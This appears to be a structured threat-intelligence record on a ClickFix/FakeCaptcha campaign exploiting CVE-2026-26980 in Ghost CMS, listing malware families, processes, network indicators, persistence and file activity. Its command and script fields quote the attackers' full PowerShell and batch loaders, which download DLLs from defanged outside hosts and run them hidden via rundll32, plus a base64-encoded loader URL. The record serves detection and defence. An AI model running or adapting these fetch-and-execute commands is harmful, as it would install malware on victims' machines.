title: CVE-2026-26980 Ghost CMS ClickFix Campaign
description: Attackers exploit CVE-2026-26980 in Ghost CMS to inject malicious JavaScript
  via the Admin API, delivering a multi-stage ClickFix/FakeCaptcha payload that drops
  and executes Rust-based DLL malware via rundll32. Two distinct threat actors are
  identified using different infrastructure and injection markers.
attribution: ''
malware_families:
- Ghost CMS JavaScript Loader
- installer.dll
- NotepadPlusPlus.dll
- publl.dll
- UtilifySetup.exe
- SuperAppizeSetup.msi
cves:
- CVE-2026-26980
ttps:
  processes:
  - powershell.exe
  - rundll32.exe
  - cmd.exe
  - sup.exe
  - UtilifySetup.exe
  command_lines:
  - cmd /c "move %USERPROFILE%\Downloads\update.zip %TEMP%\u.zip && tar -xf %TEMP%\u.zip
    -C %TEMP% && start /min "" %TEMP%\update.bat" & REM* I am not a robot reCAPTCHA
    Verification ID:2771
  - powershell -W 1 -C "$f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwqiycdezuj5gpqsyqn3damxbhgq/000/supman/installer.dll'
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden"
  - powershell -W 1 -C "$f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwl6ukpgv3mronv4ik2atzxsfxzq/sup/installer.dll'
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden"
  - powershell -W 1 -C "$f=$env:Temp+'\publl.dll'; iwr 'https://t[.]ly/docreport09052026.pdf'
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden"
  - powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c %~f0
    am_admin' -WindowStyle Minimized"
  - powershell -WindowStyle Hidden -Command ^"$dll = '%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll';
    ^Invoke-WebRequest 'https://taketwolabs[.]com/wp-content/NotepadPlusPlus.dll'
    -OutFile $dll -UseBasicParsing; ^Start-Process rundll32 -ArgumentList $dll, 'Begin'
    -WindowStyle Hidden"
  powershell:
  - $f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwqiycdezuj5gpqsyqn3damxbhgq/000/supman/installer.dll'
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden
  - $f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwl6ukpgv3mronv4ik2atzxsfxzq/sup/installer.dll'
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden
  - $f=$env:Temp+'\publl.dll'; iwr 'https://t[.]ly/docreport09052026.pdf' -OutFile
    $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden
  - $dll = '%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll'; Invoke-WebRequest 'https://taketwolabs[.]com/wp-content/NotepadPlusPlus.dll'
    -OutFile $dll -UseBasicParsing; Start-Process rundll32 -ArgumentList $dll, 'Begin'
    -WindowStyle Hidden
  scripts:
  - '@echo off

    powershell -W 1 -C "$f=$env:Temp+''\installer.dll''; iwr ''https://link.storjshare[.]io/raw/jwqiycdezuj5gpqsyqn3damxbhgq/000/supman/installer.dll''
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,''Begin'' -Window Hidden"

    start "" "https://youtube.com"'
  - '@echo off

    powershell -W 1 -C "$f=$env:Temp+''\installer.dll''; iwr ''https://link.storjshare[.]io/raw/jwl6ukpgv3mronv4ik2atzxsfxzq/sup/installer.dll''
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,''Begin'' -Window Hidden"

    start "" "https://wl[.]gl/supp.jpg"

    exit'
  - '@echo off

    powershell -W 1 -C "$f=$env:Temp+''\publl.dll''; iwr ''https://t[.]ly/docreport09052026.pdf''
    -OutFile $f; Start-Process rundll32 -ArgumentList $f,''Begin'' -Window Hidden"

    start "" "https://bc[.]ax/Supp.html"

    exit'
  - '@echo off

    setlocal

    if not "%1"=="am_admin" (powershell -WindowStyle Hidden -Command "Start-Process
    cmd -ArgumentList ''/c %~f0 am_admin'' -WindowStyle Minimized" & exit /b)

    mode con: cols=1 lines=1

    powershell -WindowStyle Hidden -Command ^"$dll = ''%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll'';
    ^Invoke-WebRequest ''https://taketwolabs[.]com/wp-content/NotepadPlusPlus.dll''
    -OutFile $dll -UseBasicParsing; ^Start-Process rundll32 -ArgumentList $dll, ''Begin''
    -WindowStyle Hidden"

    exit'
  - atob("aHR0cHM6Ly9jbG80c2hhcmEueHl6LzExejc3dTMucGhw")
  - d += a.search.substring(1)
  - c.id = btoa(a.origin)
  - b.appendChild(c)
  registry_keys: []
  image_loads:
  - installer.dll
  - NotepadPlusPlus.dll
  - publl.dll
  network_connections:
  - rundll32.exe -> link.storjshare[.]io:443
  - rundll32.exe -> taketwolabs[.]com:443
  - powershell.exe -> clo4shara[.]xyz:443
  - powershell.exe -> cloud-verification[.]com:443
  - powershell.exe -> com-apps[.]cc:443
  - powershell.exe -> jalwat[.]com:443
  - UtilifySetup.exe -> web-telegram[.]ug:443
  - UtilifySetup.exe -> amazonbusketss-535659318049-us-west-1-an.s3.us-west-1.amazonaws[.]com:443
  file_activity:
  - '%TEMP%\u.zip'
  - '%TEMP%\update.bat'
  - '%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll'
  - '%appdata%\local\SuperMaxion'
  persistence:
  - Electron app UtilifySetup.exe uses setLoginItemSettings API for login item persistence
  - Ghost CMS Admin API key injection via PUT /ghost/api/admin/posts/:id/ to maintain
    malicious script in CMS posts
  process_relations:
  - cmd.exe -> powershell.exe
  - powershell.exe -> rundll32.exe
  - cmd.exe -> rundll32.exe
